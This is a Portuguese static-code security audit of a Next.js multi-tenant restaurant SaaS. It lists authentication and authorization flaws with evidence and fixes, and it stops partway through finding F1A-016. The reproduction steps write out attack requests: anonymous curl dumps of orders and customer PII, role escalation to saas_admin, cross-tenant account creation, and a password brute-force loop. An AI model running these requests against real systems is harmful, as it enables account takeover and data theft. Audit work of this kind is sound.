# 01-seguranca-1a.md — Autenticação e Autorização (equipe da loja / SaaS admin)

> Parte **1A** da Fase 1 da auditoria. Somente leitura. Evidência sempre no formato `arquivo:linha`.
> Relatório produzido por varredura estática de código (nenhum teste dinâmico executado).

Auditoria concluída (somente leitura; nenhum arquivo alterado; nenhum comando executado contra o banco).

---

# FASE 1.1 — Autenticação e Autorização da equipe da loja e administradores

## Resumo

O achado mais grave é estrutural: **o `middleware.ts` da raiz não está sendo compilado pelo Next.js**. Como o projeto usa `src/app`, o Next só procura `middleware.*` em `<repo>/src` (`node_modules/next/dist/build/index.js:477,486` → `rootDir = join(pagesDir || appDir, "..")` = `src`), e não existe `src/middleware.ts`. O build de produção local (`.next/server/middleware-manifest.json`, gerado em 08/10/2026 00:10) confirma: `{"version":3,"middleware":{},"functions":{}}`. Logo **nenhum controle de acesso central roda**: `PUBLIC_ROUTES`, a injeção de `x-user-id`/`x-establishment-id`/`x-user-role` e o `jwtVerify` do middleware estão mortos — a única barreira real é o `verifyAuth` rota a rota, e **51 rotas não o chamam**, ficando totalmente anônimas (dump de pedidos com `trackingToken`, DRE/fluxo de caixa, cadastro de categorias/estoque/despesas/fornecedores, vazamento de tokens de motoboy). Mesmo nas rotas protegidas, **o `role`/`permissions` praticamente nunca é checado no backend** (existe exatamente 1 checagem de permissão em toda a API): a matriz de permissões inteira é implementada escondendo itens de menu no cliente. Há escalonamento vertical trivial (`PATCH /api/users/[id]` aceita `role: "saas_admin"` → login de plataforma), escalonamento horizontal (`POST /api/delivery-persons` cria usuário em qualquer tenant), logout puramente client-side, sem MFA, sem verificação de e-mail, política de senha de 4 a 6 caracteres com defaults `123456`, e rate limit em `Map` por instância usada em apenas 1 endpoint.

---

## Tabela de achados

| ID | Severidade | Módulo | Título | Esforço |
|---|---|---|---|---|
| F1A-001 | **CRÍTICO** | Autenticação central | `middleware.ts` fora do build — nenhum controle de acesso perimetral executa | P |
| F1A-002 | **CRÍTICO** | Autorização | Escalonamento vertical: qualquer usuário altera `role`/`permissions`/`isActive` e cria `saas_admin` via `/api/users` | P |
| F1A-003 | **CRÍTICO** | Multi-tenant | Criação de conta em outro tenant via `POST /api/delivery-persons` (sem auth, senha default) | P |
| F1A-004 | **CRÍTICO** | Cliente × equipe | `GET /api/orders` anônimo devolve todos os pedidos de qualquer tenant com `trackingToken` + PII | P |
| F1A-005 | **CRÍTICO** | Multi-tenant | 51 rotas sem `verifyAuth`: leitura/escrita anônima cross-tenant (financeiro, caixa, estoque, despesas…) | M |
| F1A-006 | **ALTO** | Força bruta | `/api/users/change-password`: rota pública + auth opcional + min 4 + sem rate limit = oráculo ilimitado | P |
| F1A-007 | **ALTO** | Força bruta | Rate limit só em `/api/auth/login`, em `Map` por instância (cold start) e por IP spoofável | M |
| F1A-008 | **ALTO** | Autorização | Matriz de permissões só existe no front — 1 checagem de papel em toda a API | G |
| F1A-009 | **ALTO** | Segredos | Chaves de pagamento/WhatsApp legíveis e graváveis por qualquer funcionário (`SAFE_FIELDS`) | M |
| F1A-010 | **ALTO** | Sessão | Logout não revoga nada no servidor; tokens e cookies permanecem válidos 24h/7d | M |
| F1A-011 | **ALTO** | Cliente-final | `/api/customers` GET/POST/PUT anônimos: enumeração e adulteração de PII de qualquer tenant | P |
| F1A-012 | **ALTO** | Controle de acesso | Allowlist `PUBLIC_ROUTES` incoerente (se/ quando o middleware for religado, quebra e expõe) | P |
| F1A-013 | **MÉDIO** | MFA | Sem MFA para administradores e sem verificação de e-mail no cadastro | G |
| F1A-014 | **MÉDIO** | Senhas | Política fraca e divergente (0/4/6), default `123456`, `mustChangePassword` só no front | P |
| F1A-015 | **MÉDIO** | Força bruta | Enumeração de usuários via `403` antes do `bcrypt.compare` em 3 logins | P |
| F1A-016 | **MÉDIO** | Dispositivos | Token do motoboy: 64 bits, sem expiração/rotação, vazado em API anônima + mass assignment | P |
| F1A-017 | **MÉDIO** | Sessão | Tokens de equipe em `localStorage` (XSS); cookies httpOnly criados e nunca lidos | M |
| F1A-018 | **MÉDIO** | Sessão | `verifyAuth` não revalida `isActive`/`role` no banco; refresh sem rotação | P |
| F1A-019 | **MÉDIO** | Caixa | `canCloseRegister` só esconde o botão — backend fecha caixa de qualquer perfil | P |
| F1A-020 | **MÉDIO** | Cliente-final | OTP devolvido em `devCode` + `Math.random` + log + bypass fixo de limites | M |
| F1A-021 | **BAIXO** | Cadastro | `POST /api/establishments` devolve hash da senha; localStorage grava `id` errado | P |
| F1A-022 | **BAIXO** | Cron | Fail-open quando `CRON_SECRET` ausente (`dev-secret` / `Bearer undefined`) | P |

---

## Detalhamento

### F1A-001 — CRÍTICO — Autenticação central — `middleware.ts` não roda

**Evidência**
- `middleware.ts:64-66` — `export const config = { matcher: ["/api/:path*"] }` e `PUBLIC_ROUTES` em `middleware.ts:10-21`; injeção de headers em `middleware.ts:51-54`.
- `node_modules/next/dist/build/index.js:477` — `const rootDir = path.join(pagesDir || appDir, "..")`; `:486` — `getFilesInDir(rootDir)` com `middlewareDetectionRegExp`. Com `appDir = <repo>/src/app` (`node_modules/next/dist/lib/find-pages-dir.js:35-38`), `rootDir = <repo>/src`.
- Não existe `src/middleware.ts` (`find . -maxdepth 3 -name middleware.ts` → apenas `./middleware.ts` e o backup do hotfix).
- `.next/server/middleware-manifest.json` (build de produção, 08/10/2026 00:10) → `{"version":3,"middleware":{},"functions":{},"sortedMiddleware":[]}`.
- `git status` → `middleware.ts` não modificado em relação ao HEAD (`aae4530`).

**Impacto no negócio** — Não existe porta de entrada única de autenticação. Todo "protegido" depende do `verifyAuth` de cada rota; onde ele falta, a rota está aberta ao mundo. Também explica por que `api/alerts/route.ts:8` (o único leitor dos headers) nunca vê `x-establishment-id` e cai no fallback de query string. Cadeia de comprometimento direta: F1A-004/005/011.

**Como reproduzir** — `curl https://<host>/api/dashboard?establishmentId=<id-de-qualquer-tenant>` sem `Authorization` → 200 com o dashboard financeiro. Depois: `cat .next/server/middleware-manifest.json` após `next build` → `middleware` vazio.

**Correção** — Mover o arquivo para `src/middleware.ts` e **revalidar a allowlist antes de religar** (ver F1A-012):

```bash
git mv middleware.ts src/middleware.ts
```
Gate de regressão no CI:
```js
// scripts/check-middleware.js  (roda antes do build)
const m = require("../.next/server/middleware-manifest.json")
if (!Object.keys(m.middleware || {}).length) { console.error("MIDDLEWARE NÃO COMPILADO"); process.exit(1) }
```

**Esforço** — P (mover arquivo + gate), mas o rollback funcional exige F1A-012.

---

### F1A-002 — CRÍTICO — Autorização — Escalonamento vertical em `/api/users`

**Evidência**
- `src/app/api/users/[id]/route.ts:11-19` — só valida `verifyAuth` + `user.establishmentId !== establishmentId`.
- `:26` — `if (body.role) data.role = body.role` (sem allowlist).
- `:27` — `if (body.permissions) data.permissions = JSON.stringify(body.permissions)`.
- `:28` — `if (typeof body.isActive === "boolean") data.isActive = body.isActive`.
- `:29` — `canCloseRegister`; `:30-32` — `password` com apenas `length > 0` (**mínimo de 1 caractere**, sem senha atual).
- `:34-47` — `prisma.user.update` direto.
- `:56-71` — `DELETE` idem (sem checagem de papel; proteção do "último admin" só existe no front: `usuarios/page-content.tsx:200-208`).
- `src/app/api/users/route.ts:40-46,68-69` — `POST` aceita `role`/`permissions` arbitrários (`role \|\| "atendente"`), sem checar o papel do chamador; `:54,72` apenas força o tenant (isso sim está correto).
- `src/app/api/saas-admin/login/route.ts:25-46` — emite cookie de plataforma se `role === "saas_admin"`; não exige `establishmentId`.

**Impacto no negócio** — Qualquer atendente (ou usuário KDS/motoboy) pode: (1) promover a si mesmo a `admin`; (2) dar `permissions` completas; (3) desativar todos os demais inclusive o dono; (4) trocar a senha de colegas **sem conhecer a senha atual**; (5) **criar um usuário com `role: "saas_admin"` e logar no painel da plataforma**, alcançando todos os tenants do SaaS (WHATSAPP-Tech, bot-config, recipient, templates — `requireSaasAdmin` em `saas-admin/establishments/[id]/bot-config/route.ts:7`).

**Como reproduzir**
```http
PATCH /api/users/<meu-id>        Authorization: Bearer <token-de-atendente>
{ "role": "admin", "permissions": ["dashboard","usuarios","config","financeiro"] }

POST /api/users                  Authorization: Bearer <mesmo token>
{ "name":"x","email":"x@y.z","password":"a","role":"saas_admin" }

POST /api/saas-admin/login       { "email":"x@y.z","password":"a" }   → cookie saas_admin_token
```

**Correção**
```ts
// src/lib/auth.ts
export function requirePermission(auth: AuthUser, ...perms: string[]) {
  if (auth.role === "admin") return true
  return perms.some((p) => auth.permissions.includes(p))
}

// users/[id]/route.ts PATCH
const isAdmin = authUser.role === "admin" || authUser.permissions.includes("usuarios")
if (!isAdmin) return jsonError("Não autorizado", 403)
if (params.id === authUser.userId && (body.role || body.permissions))
  return jsonError("Não é permitido alterar o próprio papel/permissões", 403)
const ALLOWED_ROLES = ["admin","atendente","motoboy","kds"]      // sem saas_admin
if (body.role && !ALLOWED_ROLES.includes(body.role)) return jsonError("Papel inválido", 400)
if (body.password && body.password.length < 8) return jsonError("Senha fraca", 400)
// e: nunca aceitar role saas_admin em criação dentro de tenant
```
Adicionar `@@map`/constraint: `role NOT IN ('saas_admin')` para usuários com `establishmentId != null`.

**Esforço** — P.

---

### F1A-003 — CRÍTICO — Multi-tenant — Criação de usuário em outro tenant

**Evidência**
- `src/app/api/delivery-persons/route.ts:30-35` — `POST` **não importa `verifyAuth`**; lê `establishmentId` do body (`:32`).
- `:37` — `const token = crypto.randomBytes(8).toString("hex")`; `:38` — `const password = defaultPassword \|\| "123456"`.
- `:43-53` — cria `User` com `role: "motoboy"`, `establishmentId` **do attacker** (`:51`).
- `:59` — devolve `defaultPassword` em texto plano.
- `src/app/dashboard/(auth)/usuarios/page-content.tsx:157` — front envia `defaultPassword: form.password || "123456"`.

**Impacto no negócio** — Com **qualquer conta** (ou anonimamente, via F1A-001), cria-se usuário dentro de qualquer concorrente, loga-se como `motoboy` naquele tenant e, somado ao F1A-002, sobe-se a `admin` do tenant vítima. Takeover completo de estabelecimento sem interação da vítima.

**Como reproduzir**
```http
POST /api/delivery-persons
{ "name":"x","phone":"47999999999","establishmentId":"<tenant-vitima>","defaultPassword":"123456" }
→ POST /api/auth/login { "email":"motoboy-47999999999@flowos.local","password":"123456" }
→ PATCH /api/users/<novo-id> { "role":"admin" }
```

**Corrección** — `verifyAuth(req)` obrigatório; `const establishmentId = auth.establishmentId` ignorando o body (mesmo padrão já aplicado em `users/route.ts:52-54`); validar senha mínima; não retornar a senha em claro (mostrar 1× na UI e exigir troca).

**Esforço** — P.

---

### F1A-004 — CRÍTICO — Cliente × equipe — Dump anônimo de pedidos com `trackingToken`

**Evidência**
- `src/app/api/orders/route.ts:690-697` — `GET` lê `establishmentId` da query, **sem `verifyAuth`**.
- `:748-757` — `findMany` com `include: { establishment, customer: { name, phone, ... } }` → retorna **todos os escalares do `Order`**, incluindo `trackingToken` (`prisma/schema.prisma:472`) e `deliveryCode` (`:470`).
- `src/app/api/orders/[id]/route.ts:38-44` — com `trackingToken` válido o atacante cancela o pedido.
- `src/app/api/orders/[id]/messages/route.ts:24-31,66` — token dá leitura/escrita no chat do pedido.
- Consumidor legítimo usa a mesma rota (`caixa-page.tsx:363`, `pedidos/page-content.tsx:112`) — ou seja, a rota é "de equipe" mas está sem auth.

**Impacto no negócio** — Qualquer pessoa lista histórico completo de pedidos (nome, telefone, endereço, valores) de qualquer concorrente, obtém os `trackingToken` e passa a cancelar pedidos e se passar por clientes no chat. LGPD + fraude operacional.

**Como reproduzir** — `curl "https://<host>/api/orders?establishmentId=<id>"` sem headers → JSON com todos os pedidos e `trackingToken`.

**Correção**
```ts
export async function GET(req: NextRequest) {
  const auth = verifyAuth(req)
  if (!auth) return NextResponse.json({ error: "Não autorizado" }, { status: 401 })
  const establishmentId = auth.establishmentId          // ignora a query
  ...
  const orders = await prisma.order.findMany({ where, include: {...},
    select: { id: true, orderNumber: true, status: true /* … */ } })  // nunca trackingToken/deliveryCode
}
```
Manter `trackingToken` apenas em `/api/tracking/[token]`.

**Esforço** — P.

---

### F1A-005 — CRÍTICO — Multi-tenant — Rotas sem `verifyAuth` (anônimas e cross-tenant)

**Evidência** — varredura: 51 arquivos `route.ts` sem `verifyAuth`/`requireSaasAdmin` e com `establishmentId` vindo de query/body:

| Rota | Evidência | Efeito |
|---|---|---|
| `GET/POST /api/dashboard` | `dashboard/route.ts:20-29` | KPIs/receita de qualquer tenant |
| `GET /api/financial/{cash-flow,dre,cmv,receitas}` | `financial/cash-flow/route.ts:7,17-18`; `dre/route.ts:5,16,23,28` | DRE e fluxo de caixa cross-tenant |
| `GET/POST /api/cash-register` | `cash-register/route.ts:4-14,16-40` | Abre caixa em nome de outro tenant |
| `GET/POST /api/categories` | `categories/route.ts:9,42,66` | Cria/edita cardápio alheio |
| `GET/POST /api/stock` | `stock/route.ts:6-10,44` | Escrita em estoque alheio |
| `GET/POST /api/expenses` | `expenses/route.ts:6,121-124` | Cria despesas em outro tenant (contabilidade) |
| `GET/POST/PATCH/DELETE /api/suppliers` | `suppliers/route.ts:25-45,70` | CRUD completo cross-tenant |
| `GET/POST /api/delivery-persons` | `delivery-persons/route.ts:6-27` | **Vaza `token` e `userId`** (`:22-27` espalha todos os campos) |
| `GET /api/kds/establishment` | `kds/establishment/route.ts:4-21` | — |
| `GET /api/alerts` | `alerts/route.ts:8` (aceita header forjado) | — |
| `GET /api/{stories,banners,reviews,addresses,products/featured,products/likes}` | `reviews/route.ts:56-69`, `addresses/route.ts:13-28` | conteúdo/PII |
| `GET/POST /api/{daily-combos,delivery-payments,payment-request,table-status,push*}` | arquivos homônimos | — |

**Impacto no negócio** — Escrita financeira e operacional entre tenants por qualquerVisitante; vazamento de tokens de motoboy (piora F1A-016). Muitas dessas rotas são "de equipe" (`/api/dashboard`, `/api/cash-register`, `/api/financial/*`) e hoje não exigem nem login.

**Como reproduzir** — `curl -X POST https://<host>/api/expenses -d '{"description":"x","amount":1,"establishmentId":"<vitima>"}'` sem `Authorization`.

**Correção** — Padrão único por rota:
```ts
const auth = verifyAuth(req); if (!auth) return jsonError("Não autorizado", 401)
const establishmentId = auth.establishmentId
if (body.establishmentId && body.establishmentId !== establishmentId) return jsonError("Não autorizado", 403)
```
Melhor ainda: middleware (F1A-001) injeta `x-establishment-id` e as rotas **nunca** aceitam `establishmentId` do cliente.

**Esforço** — M (mecânico, ~30 rotas).

---

### F1A-006 — ALTO — Força bruta — `/api/users/change-password` é oráculo ilimitado

**Evidência**
- `src/app/api/users/change-password/route.ts:18-23`:
```ts
const user = verifyAuth(req)
if (user) {                       // ← se NÃO houver token, o bloco inteiro é pulado
  if (user.userId !== userId && user.role !== "admin") return 403
}
```
- `:14` — `newPassword.length < 4` (**mínimo 4**).
- `:30-32` — `bcrypt.compare(currentPassword, targetUser.password)` sem limite de tentativas.
- `middleware.ts:18` — `/api/users/change-password` está em `PUBLIC_ROUTES` (mesmo que o middleware volte a rodar, a rota continua pública).
- Não há `checkRateLimit` nesta rota (`grep` → só `auth/login/route.ts:31` e `verification`).

**Impacto no negócio** — Não autenticado, quem tenha um `userId` (vazam em `delivery-persons/route.ts:18` e em respostas internas) brute-forceia a senha atual sem limite e a redefine (min 4). É o único caminho que troca senha **sem** sessão válida.

**Como reproduzir** — `while true; do curl -s -X POST .../api/users/change-password -d '{"userId":"...","currentPassword":"'"$p"'","newPassword":"aaaa"}'; done`

**Correção**
```ts
const auth = verifyAuth(req)
if (!auth) return jsonError("Autenticação necessária", 401)
if (auth.userId !== userId && auth.role !== "admin") return jsonError("Não autorizado", 403)
// + checkRateLimit(`pwchange:${ip}`, 5, 60_000) e newPassword.length >= 8
```
Se a intenção era "troca sem sessão", usar fluxo de reset (`/api/auth/forgot`) em vez desta rota.

**Esforço** — P.

---

### F1A-007 — ALTO — Força bruta — Rate limit ausente/instável

**Evidência** — `grep "checkRateLimit|rate-limit|attempts|cooldown"` no código:

| Endpoint | Rate limit? | Evidência |
|---|---|---|
| `POST /api/auth/login` | **Sim**, 15/min por IP | `login/route.ts:30-34`; reset em `:58` |
| `POST/PUT /api/verification` | **Sim**, porém persistido em DB (cooldown 60s, 5/h, 10/dia, 3 tentativas) | `verification/route.ts:6-11,64-90,322-335` |
| `POST /api/auth/kds-login` | **Não** | arquivo não importa `rate-limit` |
| `POST /api/saas-admin/login` | **Não** | `saas-admin/login/route.ts` sem import |
| `POST /api/auth/forgot` | **Não** | `forgot/route.ts` sem import |
| `POST /api/auth/reset` | **Não** | `reset/route.ts` |
| `POST /api/auth/refresh` | **Não** | `refresh/route.ts` |
| `POST /api/auth/change-password` | **Não** | `auth/change-password/route.ts` |
| `POST /api/users/change-password` | **Não** | ver F1A-006 |
| `POST /api/users`, `POST /api/delivery-persons` | **Não** | criação ilimitada de contas |

Armazenamento: `src/lib/rate-limit.ts:6` — `const store = new Map(...)`; `:9-14` — `setInterval` no escopo do módulo; `:16-32` — lógica.
Chave: `login/route.ts:30` — `req.headers.get("x-forwarded-for") || req.headers.get("x-real-ip") || "unknown"` (header bruto, sem normalização).

**Impacto no negócio** — (a) em **Vercel serverless cada instância tem seu próprio `Map`**: cold start zera a contagem e requests distribuídos por múltiplas lambdas nunca somam → 15/min efetivos viram N×15/min; (b) `setInterval` pode nem executar em ambiente congelável; (c) o valor do `x-forwarded-for` inteiro (cadeia de hops) permite gerar chaves ilimitatas se o cliente influenciar o header; (d) contas KDS/admin SaaS e recuperação de senha ficam sem proteção.

**Como reproduzir** — Disparar 100 logins em 5s a partir de 10 conexões paralelas e observar que nem sempre chega 429.

**Correção** — Rate limit compartilhado (Upstash Redis ou tabela Prisma) + chave `ip` normalizada (último hop) **e** `email` normalizado:
```ts
const ip = (req.headers.get("x-forwarded-for") ?? "").split(",").pop().trim()
await rateLimit({ key: `login:${ip}`, limit: 15, window: 60 })
await rateLimit({ key: `login:${email.toLowerCase()}`, limit: 5, window: 60 })
```
Aplicar em `saas-admin/login`, `kds-login`, `forgot`, `reset`, `users/change-password`, `auth/change-password`, `refresh`.

**Esforço** — M.

---

### F1A-008 — ALTO — Autorização — A matriz inteira é client-side

**Evidência** — grep por `permissions.includes|role ===|role !==` em `src/app/api` devolve **uma única** checagem de autorização de negócio:

- `src/app/api/cash-register/[id]/transfer/route.ts:42-45` — `if (!permissions.includes("admin") && !permissions.includes("config")) return 403` ✔ (única)

Todas as demais referências a `role` na API são de *login* (`login/route.ts:42,74`), de *sessão* (`auth.ts:27`, `saas-admin-auth.ts:22`) ou de *escrita* (`users/[id]/route.ts:26`).
No front: `dashboard/(auth)/layout.tsx:84,133,239,249,262,279,295,307,323,338,355`; `caixa/caixa-page.tsx:327,1150`; `kds/(auth)/layout.tsx:22,34`.

**Impacto no negócio** — Ver matriz abaixo: **nenhuma ação de negócio é bloqueada por perfil no servidor**. Basta `curl` com um token válido para ignorar qualquer restrição.

**Correção** — Guards centrais aplicados no middleware (após F1A-001) + decorator/auxiliar por rota; ver "Top 5".

**Esforço** — G (necessário, mas é o trabalho de fundo da fase).

---

### F1A-009 — ALTO — Segredos — Configuração do estabelecimento acessível a qualquer funcionário

**Evidência**
- `src/app/api/establishments/[id]/route.ts:13-15,65-67` — GET/PATCH validam **somente** `establishmentId === params.id`.
- `:38-53` — `SAFE_FIELDS` inclui `asaasApiKey`, `efiClientSecret`, `efiCertificate`, `interClientSecret`, `interCertificatePassword`, `pagarmeApiKey`, `pagarmeWebhookKey`, `evolutionApiKey`, `metaAccessToken`, `api99Key`, `metaWebhookVerifyToken`.
- `:71-78` — `for (const key of SAFE_FIELDS) if (key in body) filtered[key] = body[key]`.
- `:17-35` — GET devolve o registro completo (inclui os mesmos segredos).

**Impacto no negócio** — Um atendente com `permissions: ["caixa"]` lê e troca as chaves de pagamento (desvio de recebível), o token Meta/WhatsApp (sequestro da comunicação) e o webhook token (forjamento de webhooks). A UI esconde "Configurações" (`layout.tsx:323`) mas a rota não.

**Como reproduzir** — `curl -H "Authorization: Bearer <atendente>" .../api/establishments/<id>` → todos os segredos no JSON.

**Correção** — Exigir `role === "admin" \|\| permissions.includes("config")` em GET e PATCH; separar campos de segredo em rota própria com re-autenticação; nunca devolver segredos em GET (retornar `hasAsaasKey: true`).

**Esforço** — M.

---

### F1A-010 — ALTO — Sessão — Logout não invalida nada

**Evidência**
- `src/app/dashboard/(auth)/layout.tsx:136-139` — `handleLogout` = `localStorage.removeItem("pedefacil-user")` + `router.push`.
- `src/app/caixa/caixa-page.tsx:1082-1085` — idem.
- `src/app/kds/(auth)/screen/page.tsx:159` — `removeItem("kds_token")`.
- Único logout server-side: `src/app/api/saas-admin/logout/route.ts:5` — `cookies().delete("saas_admin_token")`.
- `grep "cookies().delete"` → apenas essa linha. Nenhum denylist/`tokenVersion`/`jti` no schema (`prisma/schema.prisma:647-665`).
- Validade: acesso 24h (`login/route.ts:89`, `kds-login/route.ts:43`, `establishments/route.ts:94`, `refresh/route.ts:40`), refresh 7d (`login/route.ts:95`, `refresh/route.ts:47`), cookie `auth_token` 24h (`login/route.ts:113`).

**Impacto no negócio** — Funcionário demitido/conta desativada mantém acesso até 24h (ver F1A-018); token roubado/`localStorage` vazado só morre sozinho; não há "sair de todos os dispositivos".

**Como reproduzir** — Fazer login, clicar em Sair, reusar o token salvo: segue 200 em `/api/users`.

**Correção** — adotar `sessions`/`tokenVersion` no `User`:
```ts
const user = await prisma.user.select({ tokenVersion: true, isActive: true, role: true })
if (!user.isActive || payload.tv !== user.tokenVersion) return null
```
`logout` = `POST /api/auth/logout` que incrementa `tokenVersion` (invalida access **e** refresh) + `cookies().delete("auth_token")` + `cookies().delete("kds_token")`.

**Esforço** — M.

---

### F1A-011 — ALTO — Cliente-final — PII de clientes aberta

**Evidência** — `src/app/api/customers/route.ts:15-25` (CPF), `:27-49` (telefone) marcados como "public"; `:65-114` `POST` e `:116-151` `PUT` **sem `verifyAuth`**; rota está em `PUBLIC_ROUTES` (`middleware.ts:13`). Consumidor: `menu-page.tsx:568,644,1489,2514`.

**Impacto no negócio** — `GET /api/customers?phone=X&establishmentId=Y` devolve `name, cpf, address, cep, phone, totalSpent` de qualquer cliente de qualquer estabelecimento; `PUT` altera CPF/endereço de terceiros; combinação com F1A-004 (dump de pedidos) dá o mapeamento completo de clientes.

**Como reproduzir** — `curl ".../api/customers?phone=479XXXXXXXX&establishmentId=<id>"` → JSON completo.

**Correção** — Exigir OTP do próprio telefone para leitura/escrita pontual (criar sessão de cliente assinada, veja F1A-012/020); manter listagem (`:51-62`) só para equipe autenticada (já é).

**Esforço** — M.

---

### F1A-012 — ALTO — Controle de acesso — Allowlist `PUBLIC_ROUTES` incoerente

**Evidência** — `middleware.ts:10-21`: públicas `/api/auth`, `/api/customers`, `/api/orders`, `/api/tracking`, `/api/push`, `/api/delivery-persons/deliveries`, `/api/users/change-password`, `/api/webhooks`, `/api/cron`.
Porém os consumidores reais anônimos incluem rotas **fora** da lista: `menu-page.tsx:527,560,2620` (`/api/verification`), `:852,880,901,915,1071,1072,1073,1215,1251,1864` (reviews/likes/banners/stories/addresses), `cadastro/page.tsx:67` (`POST /api/establishments`), `admin-saas/login/page.tsx:18` (`/api/saas-admin/login`), páginas `admin-saas/(auth)/**` (fetch sem `Authorization`).
E, inversamente, são públicas rotas perigosas: `/api/customers` (F1A-011), `/api/orders` (F1A-004), `/api/users/change-password` (F1A-006), `/api/delivery-persons/deliveries` (F1A-016).

**Impacto no negócio** — Duas situações igualmente ruins: (1) hoje o middleware está desligado (F1A-001) → tudo aberto; (2) se alguém apenas mover o arquivo para `src/`, o app **quebra** (OTP, cadastro, painel SaaS, avaliações, endereços → 401) mantendo as rotas perigosas públicas. É uma bomba-relógio de disponibilidade.

**Como reproduzir** — Depois de `git mv middleware.ts src/middleware.ts`, abrir `/{slug}` e tentar enviar código OTP → 401.

**Correção** — Substituir allowlist por denylist explícita de rotas realmente públicas e, preferencialmente, marcar rotas com config própria:
```ts
const PUBLIC = new Set([
  "/api/auth/login","/api/auth/refresh","/api/auth/forgot","/api/auth/reset","/api/auth/kds-login",
  "/api/establishments",                       // POST cadastro (GET precisa de regra própria)
  "/api/verification","/api/orders","/api/tracking",
  "/api/customers",                            // ideal: restringir a GET+OTP
  "/api/webhooks/*","/api/cron/*",
])
```
Com testes de regressão cobrindo cada consumidor acima.

**Esforço** — P (lista) / M (testes).

---

### F1A-013 — MÉDIO — MFA — Inexistente

**Evidência** — `grep -rni "mfa|totp|2fa|speakeasy|otplib|authenticator"` em `src`, `prisma`, `package.json` → **0 ocorrências**. Verificação de e-mail no cadastro: `grep "emailVerified|isEmailVerified|verifyEmail"` → **0 ocorrências** em `src` e `prisma/schema.prisma`; `establishments/route.ts:55-78` cria `Establishment` e `User` imediatamente, sem confirmação. O único OTP do sistema é o de telefone do cliente final (`verification/route.ts`, `purpose: "whatsapp_verify"` `:108`).

**Impacto no negócio** — Conta de dono/admin e, principalmente, `saas_admin` (plataforma) protegidas apenas por senha, sem 2FA e sem e-mail confirmado — combinado com F1A-002/007 (sem rate limit no `saas-admin/login`), é o caminho mais curto para comprometer o SaaS inteiro. Cadastro com e-mail alheio também é possível (ownership não verificado).

**Como reproduzir** — `POST /api/establishments` com `email` de terceiro → conta criada e logada.

**Correção** — (1) exigir confirmação de e-mail (token de 1 link) antes de emitir token de acesso; (2) TOTP (ex. `otplib`) obrigatório para `role === "admin"` e `saas_admin`, com `amr`/`acr` no JWT; (3) step-up re-auth para `PATCH /api/establishments` (segredos) e `PATCH /api/users`.

**Esforço** — G.

---

### F1A-014 — MÉDIO — Senhas — Política fraca e divergente

**Evidência** (comparações reais):

| Ponto de entrada | Regra | Evidência |
|---|---|---|
| Cadastro (`POST /api/establishments`) | `password.length < 6` | `establishments/route.ts:20-22` |
| Front do cadastro | `form.password.length < 6` | `cadastro/page.tsx:50` |
| Reset (`POST /api/auth/reset`) | `password.length < 6` | `auth/reset/route.ts:13-15` |
| Front do reset | `password.length < 6` | `redefinir-senha/page.tsx:40` |
| Change-password autenticada | `newPassword.length < 6` | `auth/change-password/route.ts:19-21` |
| Front trocar-senha | `newPassword.length < 6` | `trocar-senha/page.tsx:30`; `login/page.tsx:103` |
| **`POST /api/users/change-password`** | **`newPassword.length < 4`** | `users/change-password/route.ts:14-16` |
| **`POST /api/users` (criar funcionário)** | **nenhuma** (só presença) | `users/route.ts:48-50` |
| **`PATCH /api/users/[id]` (trocar senha)** | **nenhuma** (`length > 0`) | `users/[id]/route.ts:30-32` |
| **`POST /api/delivery-persons`** | **nenhima**, default `"123456"` | `delivery-persons/route.ts:38`; `usuarios/page-content.tsx:82,157` |
| Login | nenhuma (só `bcrypt.compare`) | `login/route.ts:53` |

Sem exigência de maiúscula/número/símbolo, sem lista de senhas comuns/breached. Custos de hash divergentes: `bcrypt.hash(pw, 12)` (`establishments/route.ts:35`, `reset/route.ts:36`, `auth/change-password/route.ts:40`, `users/change-password/route.ts:35`) vs `10` (`users/route.ts:61`, `users/[id]/route.ts:31`, `delivery-persons/route.ts:39`).

**`mustChangePassword`** — definido em `users/route.ts:71` e `delivery-persons/route.ts:50`; limpo em `reset/route.ts:43`, `auth/change-password/route.ts:47`, `users/change-password/route.ts:41`; devolvido no login (`login/route.ts:126`). **Uso: exclusivamente client-side** — `login/page.tsx:45-49` só esconde o dashboard e mostra o form; o token já foi emitido em `login/route.ts:86-114` **antes** da troca. `saas-admin/login/route.ts:58` devolve o flag sem exigir nada.

**Impacto no negócio** — Senhas `123456` (padrão de todo funcionário novo) protegem caixa, cardápio e financeiro; o `mustChangePassword` é contornado copiando o token do `localStorage` (`fetch-auth.ts:4-11`) e chamando a API direto.

**Como reproduzir** — Criar usuário com `password: "a"` via `POST /api/users`; logar e chamar `/api/users` sem trocar a senha.

**Correção** — Helper único aplicado em **todas** as escritas de senha:
```ts
function assertPassword(p: string) {
  if (p.length < 8 || !/[A-Z]/.test(p) || !/[0-9]/.test(p))
    throw new Response(JSON.stringify({ error: "Senha fraca (mín. 8, 1 maiúscula, 1 número)" }), { status: 400 })
}
```
E no login: não emitir `token` quando `mustChangePassword === true` (devolver `mustChange: true` e tratar via fluxo de troca com reautenticação).

**Esforço** — P.

---

### F1A-015 — MÉDIO — Força bruta — Enumeração de usuários (403 pré-bcrypt)

**Evidência**
- `login/route.ts:36-44` — `user.role === "saas_admin"` → **403 antes** do `bcrypt.compare` (`:53`); `:49-51` — sem `establishmentId` → 403 também pré-bcrypt.
- `kds-login/route.ts:17-24` — `user.role !== "kds"` → 403 **antes** de `bcrypt.compare` (`:30`).
- `saas-admin/login/route.ts:20-36` — `role !== "saas_admin"` → 403 antes de `:33`.
- Respostas: 401 = inexistente/inativo; 403 = **conta ativa existe**.

**Impacto no negócio** — E-mail enumeration sem limite de tentativas (nenhum desses três tem rate limit → F1A-007), além do canal de timing (bcrypt só rota se o usuário existir). Facilita phishing direcionado a donos/admins.

**Como reproduzir** — `POST /api/auth/kds-login {"email":"dono@x.com","password":"x"}` → 403 revela que a conta existe e está ativa.

**Correção** — Executar `bcrypt.compare` contra um hash dummy sempre e devolver 401 único; mover a checagem de papel para **depois** da senha:
```ts
const hash = user?.password ?? DUMMY_HASH
const valid = await bcrypt.compare(password, hash)
if (!user || !user.isActive || !valid) return jsonError("Credenciais inválidas", 401)
if (user.role !== "kds") return jsonError("Credenciais inválidas", 401)
```

**Esforço** — P.

---

### F1A-016 — MÉDIO — Dispositivos — Token do motoboy

**Evidência**
- Geração: `delivery-persons/route.ts:37` — `crypto.randomBytes(8).toString("hex")` = **64 bits**.
- Persistência: `prisma/schema.prisma:307` — `token String @unique`; sem coluna de expiração/rotacionado em.
- Uso: `delivery-persons/deliveries/route.ts:6-21` (GET), `:44-69` (PATCH: troca status de pedido **e** `toggleActive`).
